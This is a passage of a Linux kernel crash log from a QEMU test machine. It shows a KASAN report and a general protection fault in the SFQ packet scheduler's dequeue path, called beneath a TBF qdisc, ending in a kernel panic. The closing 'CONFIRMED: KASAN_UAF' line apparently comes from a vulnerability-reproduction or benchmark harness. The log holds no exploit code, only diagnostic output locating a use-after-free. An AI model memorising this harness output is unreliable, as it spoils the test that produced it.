[    1.877866]  ? acpi_subsystem_init+0x50/0x140
[    1.877869]  start_kernel+0x301/0x3c0
[    1.877872]  x86_64_start_reservations+0x18/0x30
[    1.877873]  x86_64_start_kernel+0xce/0xe0
[    1.877875]  common_startup_64+0x13e/0x148
[    1.877877]  </TASK>
[    1.877878] 
[    1.886372] The buggy address belongs to the physical page:
[    1.886600] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa22f
[    1.886917] flags: 0x100000000000000(node=0|zone=1)
[    1.887123] raw: 0100000000000000 ffffea0000288bc8 ffffea0000288bc8 0000000000000000
[    1.887434] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    1.887744] page dumped because: kasan: bad access detected
[    1.887974] 
[    1.888045] Memory state around the buggy address:
[    1.888246]  ffff88800a22f080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[    1.888539]  ffff88800a22f100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[    1.888837] >ffff88800a22f180: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[    1.889134]                                                           ^
[    1.889407]  ffff88800a22f200: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[    1.889703]  ffff88800a22f280: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[    1.890000] ==================================================================
[    1.890298] Disabling lock debugging due to kernel taint
[    1.890535] Oops: general protection fault, probably for non-canonical address 0xe0647c0f00000008: 0000 [#1] SMP KASAN NOPTI
[    1.890971] KASAN: maybe wild-memory-access in range [0x0324007800000040-0x0324007800000047]
[    1.891301] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Tainted: G    B               6.14.0-13336-g8c0cea59d40c-dirty #1 PREEMPT(voluntary) 
[    1.891775] Tainted: [B]=BAD_PAGE
[    1.891918] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.892306] RIP: 0010:sfq_dequeue+0x56a/0xde0
[    1.892491] Code: 7c 08 84 c9 0f 85 71 04 00 00 41 8b 86 bc 00 00 00 49 01 c4 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 04 48 89 f9 48 c1 e9 03 <0f> b6 0c 01 48 89 f8 83 e0 07 83 c0 01 38 c8 7c 08 84 c9 0f 85 1c
[    1.893239] RSP: 0018:ffffc90000007d70 EFLAGS: 00010203
[    1.893459] RAX: dffffc0000000000 RBX: ffff888009c94f00 RCX: 0064800f00000008
[    1.893748] RDX: ffff88800a1ef1e8 RSI: 0000000000000004 RDI: 0324007800000047
[    1.894043] RBP: ffff88800a1ef000 R08: 0000000000000000 R09: ffff888009c94f16
[    1.894337] R10: ffffffff866f20a7 R11: 6e696c6261736944 R12: 0324007800000043
[    1.894626] R13: ffff888009c94f1c R14: ffff888009c94f00 R15: 0000000000000000
[    1.894919] FS:  0000000000000000(0000) GS:ffff8880e6972000(0000) knlGS:0000000000000000
[    1.895252] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.895485] CR2: 00007ffd69f64790 CR3: 0000000006e2a003 CR4: 0000000000770ef0
[    1.895769] PKRU: 55555554
[    1.895886] Call Trace:
[    1.895995]  <IRQ>
[    1.896086]  qdisc_peek_dequeued+0x77/0x290
[    1.896263]  tbf_dequeue+0x89/0x1020
[    1.896417]  ? __netif_schedule+0xbd/0x100
[    1.896593]  __qdisc_run+0x16f/0x18f0
[    1.896750]  ? __pfx___hrtimer_run_queues+0x10/0x10
[    1.896955]  net_tx_action+0x41e/0x6a0
[    1.897115]  handle_softirqs+0x1b5/0x5c0
[    1.897282]  ? __pfx_handle_softirqs+0x10/0x10
[    1.897472]  irq_exit_rcu+0xaf/0xe0
[    1.897619]  sysvec_apic_timer_interrupt+0x6c/0x80
[    1.897821]  </IRQ>
[    1.897915]  <TASK>
[    1.898010]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[    1.898225] RIP: 0010:pv_native_safe_halt+0xf/0x20
[    1.898428] Code: 7c c0 00 c3 cc cc cc cc 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 53 24 1f 00 fb f4 <c3> cc cc cc cc 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
[    1.899178] RSP: 0018:ffffffff85007e28 EFLAGS: 00000206
[    1.899396] RAX: ffff8880e6972000 RBX: 0000000000000000 RCX: ffffffff8425c051
[    1.899694] RDX: ffffed100da060b3 RSI: 0000000000000004 RDI: 0000000000003cf4
[    1.899991] RBP: fffffbfff0a02c88 R08: 0000000000000001 R09: ffffed100da060b2
[    1.900286] R10: ffff88806d030593 R11: ffff88806d027c60 R12: ffffffff85016440
[    1.900580] R13: ffffffff85880c10 R14: 1ffffffff0a00fcb R15: 0000000000000000
[    1.900874]  ? ct_kernel_exit.constprop.0+0xa1/0xc0
[    1.901078]  default_idle+0x9/0x10
[    1.901223]  default_idle_call+0x3a/0x60
[    1.901388]  do_idle+0x35a/0x4d0
[    1.901528]  ? __pfx_do_idle+0x10/0x10
[    1.901684]  cpu_startup_entry+0x4f/0x60
[    1.901843]  rest_init+0x10e/0x140
[    1.901982]  ? acpi_subsystem_init+0x50/0x140
[    1.902159]  start_kernel+0x301/0x3c0
[    1.902310]  x86_64_start_reservations+0x18/0x30
[    1.902496]  x86_64_start_kernel+0xce/0xe0
[    1.902664]  common_startup_64+0x13e/0x148
[    1.902837]  </TASK>
[    1.902934] Modules linked in:
[    1.903067] ---[ end trace 0000000000000000 ]---
[    1.903258] RIP: 0010:sfq_dequeue+0x56a/0xde0
[    1.903441] Code: 7c 08 84 c9 0f 85 71 04 00 00 41 8b 86 bc 00 00 00 49 01 c4 48 b8 00 00 00 00 00 fc ff df 49 8d 7c 24 04 48 89 f9 48 c1 e9 03 <0f> b6 0c 01 48 89 f8 83 e0 07 83 c0 01 38 c8 7c 08 84 c9 0f 85 1c
[    1.904164] RSP: 0018:ffffc90000007d70 EFLAGS: 00010203
[    1.904371] RAX: dffffc0000000000 RBX: ffff888009c94f00 RCX: 0064800f00000008
[    1.904653] RDX: ffff88800a1ef1e8 RSI: 0000000000000004 RDI: 0324007800000047
[    1.904949] RBP: ffff88800a1ef000 R08: 0000000000000000 R09: ffff888009c94f16
[    1.905243] R10: ffffffff866f20a7 R11: 6e696c6261736944 R12: 0324007800000043
[    1.905536] R13: ffff888009c94f1c R14: ffff888009c94f00 R15: 0000000000000000
[    1.905819] FS:  0000000000000000(0000) GS:ffff8880e6972000(0000) knlGS:0000000000000000
[    1.906134] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.906362] CR2: 00007ffd69f64790 CR3: 0000000006e2a003 CR4: 0000000000770ef0
[    1.906643] PKRU: 55555554
[    1.906755] Kernel panic - not syncing: Fatal exception in interrupt
[    1.907092] Kernel Offset: disabled
CONFIRMED: KASAN_UAF
